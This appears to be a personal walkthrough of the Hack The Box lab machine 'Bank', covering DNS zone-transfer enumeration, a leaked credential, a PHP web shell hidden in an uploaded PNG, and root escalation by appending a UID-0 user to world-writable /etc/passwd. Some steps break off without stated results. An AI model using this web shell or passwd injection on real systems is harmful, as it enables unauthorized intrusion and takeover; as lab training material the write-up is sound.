***

**Port 80**
Returns a default Apache2 Webserver
![[Pasted image 20240714120923.png]]

Running `ffuf` produced no relevant results using the IP address
![[Pasted image 20240714121504.png]]




We see Port 53 open so let's try to discover virtual hosts on the machine

***

**PORT 53**
![[Pasted image 20240714121010.png]]

Let's try a **zone transfer**
- Grabbing a zone file from victim to attacking machine
- Its basically a list of available subdomains on the victim DNS database

**DIG**
![[Pasted image 20240714121720.png]]

We will use the `@glabal-server` switch because we have the IP address. 

Unfortunately we do not have the domain name - But we can take an educated guess considering we know the machine name and HTB typically uses this schema:
`[machine_name.htb]`


Lets use `bank.htb`
Update and confirm `/etc/hosts` file to include this information
![[Pasted image 20240714122120.png]]
![[Pasted image 20240714122205.png]]


We also need to specify the `axfr` or zone transfer request 
![[Pasted image 20240714122924.png]]
![[Pasted image 20240714123035.png]]


```
sudo dig @10.10.10.29 bank.htb axfr
```
![[Pasted image 20240714123230.png]]

Results:
```
www.bank.htb
chris.bank.htb
ns.bank.htb
```


Create a command using REGEX to filter for all possible domains.
```
sudo dig @10.10.10.29 bank.htb axfr | grep -Eo '(\w+\.)?\w+\.htb'
```
![[Pasted image 20240714124411.png]]

Pipe into `sort` and remove duplicates
```
sudo dig @10.10.10.29 bank.htb axfr | grep -Eo '(\w+\.)?\w+\.htb' | sort -u
```
![[Pasted image 20240714124627.png]]


In order to use these domains within the `/etc/hosts` file, we must first remove the new line character at the end of each entry.
We can use the `tr` - translate command to substitute an empty space for the new lines
![[Pasted image 20240714124825.png]]


```
sudo dig @10.10.10.29 bank.htb axfr | grep -Eo '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' '
```
![[Pasted image 20240714124959.png]]


Now append the IP address, followed by a tab using `awk`

```
 sudo dig @10.10.10.29 bank.htb axfr | grep -Eo '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' ' | awk '{print "10.10.10.29\t" $2 " " $3 " " $4 " " $5}'
```
![[Pasted image 20240714125649.png]]
*(Cropped screenshot for readability)


Now we pipe the `stdout` of this command to the clipboard and paste into the `/etc/hosts` file!
```
 sudo dig @10.10.10.29 bank.htb axfr | grep -Eo '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' ' | awk '{print "10.10.10.29\t" $2 " " $3 " " $4 " " $5}' | xclip -selection clipboard
```

**AQUATONE**
Tool for Domain Flyovers

Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
https://github.com/michenriksen/aquatone


![[Pasted image 20240715152017.png]]
- This requires either Chrome or Chromium to run
- `sudo apt install chromium -y`

```
sudo ./aquatone -h
```
![[Pasted image 20240715152449.png]]

Grab the domains using dig

```
 sudo dig @10.10.10.29 bank.htb axfr | grep -Eo '(\w+\.)?\w+\.htb' | sort -u
```
![[Pasted image 20240715152750.png]]

Create a file for AQUATONE to take in:
![[Pasted image 20240715153102.png]]


Script inserting `http://` using `sed`
```
sudo sed -i 's/^/http:\/\//gi' /tmp/bank.txt
```
![[Pasted image 20240715153917.png]]


Pipe into AQUATONE as root:

Investigate this endpoint using **BURPSUITE**
I have Burp capturing in the background with the Proxy Intercept set to off

I then sorted the Directory page by file size to check for any anomalies. 

It appears that all of the `.acc` files contain encrypted PII and are roughly 580 in size.

BUT, one result is half the size.
![[Pasted image 20240715165911.png]]

Download and view its contents:
![[Pasted image 20240715165956.png]]
```
chris@bank.htb : !##HTBB4nkP4ssw0rd!##
```


These turn out to be account login details for `http://bank.htb`
![[Pasted image 20240715170254.png]]


Lets work through this through CLI
```
curl http://bank.htb/balance-transfer
```
![[Pasted image 20240715171531.png]]

Follow Redirects
We get Source-code for the page
```
curl --L http://bank.htb/balance-transfer 
```


Locate how many `.acc` files. The point is to drill this down
![[Pasted image 20240715171829.png]]


Create a command to isolate Byte Size
```
 sudo curl -sL http://bank.htb/balance-transfer | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f 7
```
![[Pasted image 20240715172723.png]]


Translate `">` to clean up

```
 sudo curl -sL http://bank.htb/balance-transfer | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f 1,7 | tr '">' ' ' | sort -k2 | head -2
```

![[Pasted image 20240715172813.png]]

We can also isolate and catch the occurrence of each size
```
 sudo curl -sL http://bank.htb/balance-transfer | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f 1,7 | tr '">' ' ' | cut -d ' ' -f3 | sort | uniq -c
```
![[Pasted image 20240715173045.png]]

Find the anomaly and bring down
```
sudo curl -sL http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
```

**FILE UPLOAD**

Within the web app, we see an area for file uplaods. We are currently running PHP on the back end

Upload a php reverse shell payload. The extension `php` was filtered
![[Pasted image 20240715170706.png]]

Lets try with add extension
`rev.php.png`

![[Pasted image 20240715171007.png]]


Its possible to bypass client-side filtering by spoofing the extension.
However, This also fails to execute when navigating to `http://bank.htb/uploads/`

This leads me to believe that the filter does not check for file content

**Intercept with BURPSUITE**
![[Pasted image 20240715174308.png]]

Send to REPEATER
![[Pasted image 20240715174412.png]]
![[Pasted image 20240715174520.png]]

Manipulating the extensions and content-type headers revealed no entry point. 



Try uploading an actual image file and inject php payload within the image content in order bypass the file check and trick the client side input into thinking we have an actual image file

![[Pasted image 20240715191810.png]]

Choose any random line after `PNG` (try to preserve the PNG magic bytes, this may take some guessing. Not exact science) and delete 
![[Pasted image 20240715192134.png]]

At the very end of the modified `PNG` file, click to show non-printable characters and remove any null bytes
![[Pasted image 20240715192348.png]]
![[Pasted image 20240715192513.png]]


Enter `PHP` payload to call a system function to make a HTTP request to execute a command
```
<?php system($_REQUEST["cmd"]);?>
```
![[Pasted image 20240715192727.png]]


Upload and navigate to the endpoint to inspect
![[Pasted image 20240715193232.png]]

We get no errors loading the page but its empty. 
Remember, we deleted most of the image data earlier.


Pass a command to the URL endpoint so the php function to execute
```
http://bank.htb/uploads/bank1.png?cmd=ls
```

This does not work. 


Upon further inspection of the login page source code, we find this developer note:
![[Pasted image 20240715193723.png]]


Modify the payload in BURP and change extension
![[Pasted image 20240715194438.png]]

This was accepted but did not run the `php` command successfully

I went back to the original `PNG` file and deleted further down the file, around line 42 instead and reinserted my php code

![[Pasted image 20240715195116.png]]

Try inserting command in url

**ALTERNATIVE - PWN CAT**

We only needed the `.htb` extension after all so there is no need for the actual png numbers

**TASK 11**
```
There's an alternative path from www-data to root on Bank. What is the full path of the critical Linux system file that is world-writable that shouldn't be?
```


It turns out that `/etc/passwd` is writeable by `www-data` 
This turns out to be priv esc vulnerability because we can actually write a new user to this file

To do this, we need to generate an MD5 hash of a password using `openssl`

Create the proper syntax for the `/etc/passwd` to read, and the system will take in as a valid account

![[Pasted image 20240716101243.png]]

Check Usage:
![[Pasted image 20240716101328.png]]
![[Pasted image 20240716101354.png]]

Generate MD5 Hash
![[Pasted image 20240716103224.png]]

Insert a new user into the `/etc/passwd` file
```
echo 'hacker:$1$ik8jPrry$A.Z1eT8Vljb.JN1/pDKUX/:0:0:hacked:/root:/bin/bash' >> /etc/passwd
<ik8jPrry$A.Z1eT8Vljb.JN1/pDKUX/:0:0:hacked:/root:/bin/bash' >> /etc/passwd
```

`/etc/passwd` File breakdown:
- Username
- Hash
- User ID
- Group ID
- Notes
- Home Folder
- Login Shell


This will require a more secure shell - Use python to upgrade and `su` into the new user!
